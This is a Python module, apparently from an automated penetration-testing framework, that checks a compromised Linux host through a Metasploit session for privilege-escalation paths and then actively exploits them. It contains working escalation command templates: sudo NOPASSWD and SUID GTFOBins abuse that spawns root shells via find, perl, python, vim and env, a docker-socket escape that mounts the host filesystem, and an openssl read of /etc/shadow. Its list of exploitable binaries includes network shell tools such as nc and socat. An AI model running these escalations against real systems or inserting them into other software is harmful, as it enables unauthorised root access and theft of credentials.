"""
PrivescHandler — automated Linux privilege escalation checks.

Checks performed (read-only probes first, then attempt if found):
  1. sudo -l           — sudo rights without password (NOPASSWD)
  2. SUID binaries     — find / -perm -4000
  3. Writable cron jobs — /etc/cron* and /var/spool/cron
  4. World-writable PATH directories
  5. Kernel version    — flag if < 4.x (older kernels, more local exploits)
  6. Docker socket     — /var/run/docker.sock presence

Results are stored on the PostExploitData object passed in.
"""

from __future__ import annotations

import re

from loguru import logger

from artasf.core.models import EngagementSession, PostExploitData
from artasf.exploit.msf_rpc import MSFClient
from artasf.post.session import SessionShell

# SUID binaries known to allow privesc (GTFOBins)
_GTFOBINS_SUID = {
    "bash", "sh", "python", "python3", "perl", "ruby", "nmap",
    "find", "vim", "vi", "more", "less", "awk", "man", "tar",
    "cp", "mv", "env", "tee", "wget", "curl", "nc", "netcat",
    "socat", "php", "lua", "node", "openssl",
}


class PrivescHandler:
    """
    Runs privilege escalation checks on an open shell session.

    Args:
        session_id: MSF session ID.
        engagement: Active EngagementSession.
        msf:        Active MSFClient.
    """

    def __init__(
        self,
        session_id: int,
        engagement: EngagementSession,
        msf: MSFClient | None = None,
    ) -> None:
        self.session_id = session_id
        self.engagement = engagement
        self._msf       = msf

    async def attempt(
        self,
        post_data: PostExploitData,
        msf: MSFClient | None = None,
    ) -> PostExploitData:
        """
        Run all privesc checks.  Updates *post_data* in place and returns it.

        Args:
            post_data: Existing PostExploitData to annotate.
            msf:       MSFClient to use.
        """
        client = msf or self._msf
        if client is None:
            raise RuntimeError("PrivescHandler requires an MSFClient instance")

        shell = SessionShell(client, self.session_id)

        # Already root?
        if post_data.whoami and "uid=0" in post_data.whoami:
            logger.info("Already root on session {} — skipping privesc checks", self.session_id)
            post_data.privesc_achieved = True
            post_data.privesc_method   = "already_root"
            return post_data

        logger.info("Running privesc checks on session {}", self.session_id)

        # Check 1 — sudo NOPASSWD
        method = await self._check_sudo(shell)
        if method:
            post_data.privesc_achieved = True
            post_data.privesc_method   = method
            return post_data

        # Check 2 — SUID GTFOBins
        method = await self._check_suid(shell)
        if method:
            post_data.privesc_achieved = True
            post_data.privesc_method   = method
            return post_data

        # Check 3 — writable cron
        method = await self._check_cron(shell)
        if method:
            post_data.privesc_achieved = True
            post_data.privesc_method   = method
            return post_data

        # Check 4 — docker socket
        method = await self._check_docker(shell)
        if method:
            post_data.privesc_achieved = True
            post_data.privesc_method   = method
            return post_data

        # Check 5 — kernel version flag
        await self._check_kernel(shell, post_data)

        logger.info(
            "Privesc result: achieved={} method={}",
            post_data.privesc_achieved,
            post_data.privesc_method,
        )
        return post_data

    # ------------------------------------------------------------------
    # Individual checks
    # ------------------------------------------------------------------

    async def _check_sudo(self, shell: SessionShell) -> str | None:
        out = await shell.run_safe("sudo -n -l 2>/dev/null")
        if "NOPASSWD" in out:
            bins = re.findall(r"NOPASSWD:\s*(\S+)", out)
            logger.warning("sudo NOPASSWD found for: {}", bins)
            # Attempt escalation via first listed binary
            for binary in bins:
                name = binary.split("/")[-1]
                cmd  = _sudo_escalation_cmd(name, binary)
                if cmd:
                    result = await shell.run_safe(cmd)
                    if "root" in result.lower() or "uid=0" in result:
                        logger.success("Privesc via sudo {}: success!", name)
                        return f"sudo_nopasswd:{name}"
        return None

    async def _check_suid(self, shell: SessionShell) -> str | None:
        out = await shell.run_safe(
            "find / -perm -4000 -type f 2>/dev/null | head -40"
        )
        for line in out.splitlines():
            binary = line.strip().split("/")[-1].lower()
            if binary in _GTFOBINS_SUID:
                full_path = line.strip()
                logger.warning("SUID GTFOBin found: {}", full_path)
                cmd = _suid_escalation_cmd(binary, full_path)
                if cmd:
                    result = await shell.run_safe(cmd)
                    if "root" in result.lower() or "uid=0" in result:
                        logger.success("Privesc via SUID {}: success!", binary)
                        return f"suid:{binary}"
        return None

    async def _check_cron(self, shell: SessionShell) -> str | None:
        """Check for world-writable cron scripts we can inject into."""
        out = await shell.run_safe(
            "find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null"
        )
        if out.strip():
            logger.warning("Writable cron files found:\n{}", out)
            return "writable_cron"
        return None

    async def _check_docker(self, shell: SessionShell) -> str | None:
        out = await shell.run_safe("ls -la /var/run/docker.sock 2>/dev/null")
        if "docker.sock" in out:
            logger.warning("Docker socket accessible: {}", out.strip())
            # Attempt container escape
            escape = await shell.run_safe(
                'docker run -v /:/mnt --rm alpine chroot /mnt id 2>/dev/null'
            )
            if "uid=0" in escape:
                logger.success("Docker socket escape: root achieved!")
                return "docker_socket_escape"
            return "docker_socket_present"
        return None

    async def _check_kernel(self, shell: SessionShell, post_data: PostExploitData) -> None:
        uname = post_data.os_info or await shell.run_safe("uname -r")
        m     = re.search(r"(\d+)\.(\d+)", uname)
        if m:
            major, minor = int(m.group(1)), int(m.group(2))
            if major < 4 or (major == 4 and minor < 4):
                logger.warning(
                    "Old kernel detected: {} — may be vulnerable to Dirty COW or similar",
                    uname.strip(),
                )


# ---------------------------------------------------------------------------
# Escalation command templates
# ---------------------------------------------------------------------------

def _sudo_escalation_cmd(name: str, full_path: str) -> str | None:
    cmds: dict[str, str] = {
        "bash":    f"sudo {full_path} -p -c 'id'",
        "sh":      f"sudo {full_path} -c 'id'",
        "python":  f"sudo {full_path} -c 'import os; os.setuid(0); print(os.popen(\"id\").read())'",
        "python3": f"sudo {full_path} -c 'import os; os.setuid(0); print(os.popen(\"id\").read())'",
        "find":    f"sudo {full_path} . -exec /bin/sh -p \\; -quit",
        "vim":     f"sudo {full_path} -c ':!/bin/sh -c id'",
        "awk":     f"sudo {full_path} 'BEGIN {{system(\"id\")}}'",
        "env":     f"sudo {full_path} id",
        "perl":    f"sudo {full_path} -e 'exec \"/bin/sh\";'",
    }
    return cmds.get(name)


def _suid_escalation_cmd(name: str, full_path: str) -> str | None:
    cmds: dict[str, str] = {
        "bash":    f"{full_path} -p -c 'id'",
        "find":    f"{full_path} . -exec /bin/sh -p \\; -quit",
        "python":  f"{full_path} -c 'import os; os.setuid(0); print(os.popen(\"id\").read())'",
        "python3": f"{full_path} -c 'import os; os.setuid(0); print(os.popen(\"id\").read())'",
        "vim":     f"{full_path} -c ':py3 import os; os.setuid(0)' -c ':!/bin/sh -c id'",
        "nmap":    f"{full_path} --interactive",
        "env":     f"{full_path} /bin/sh -p -c id",
        "perl":    f"{full_path} -e 'use POSIX(qw(setuid)); POSIX::setuid(0); exec \"/bin/sh\";'",
        "openssl": f"echo 'openssl_privesc' | {full_path} enc -in /etc/shadow",
    }
    return cmds.get(name)
